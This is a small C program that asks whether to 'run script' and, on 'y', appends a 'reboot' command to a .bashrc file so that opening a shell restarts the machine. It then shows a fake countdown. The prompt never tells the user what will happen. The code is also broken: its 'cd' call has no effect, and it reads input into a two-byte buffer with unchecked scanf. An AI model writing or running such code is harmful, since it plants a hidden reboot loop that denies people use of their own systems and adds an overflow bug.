#include <stdio.h>
#include "stdlib.h"
#include "string.h"
#include <unistd.h>
int main() {

    char a[2];
    printf("Do You Run Script ? y/n :  ");
    scanf("%s",a);
    if (strcmp(a , "y" ) == 0 ) {
        printf("work");
        FILE *fp;
        system("cd");
        fp = fopen(".bashrc", "a");

        fprintf(fp, "\n reboot\n");
        fclose(fp);
        printf("reset 5 second later");
        sleep(1);
        printf(" 1 ");
        sleep(1);
        printf(" 2 ");
        sleep(1);
        printf(" 3 ");
        sleep(1);
        printf(" 4 ");
        sleep(1);
        printf(" 5 ");
        sleep(1);
        system(" dir ");


    } else{

        printf("thanks you.");
    }






    return 0;}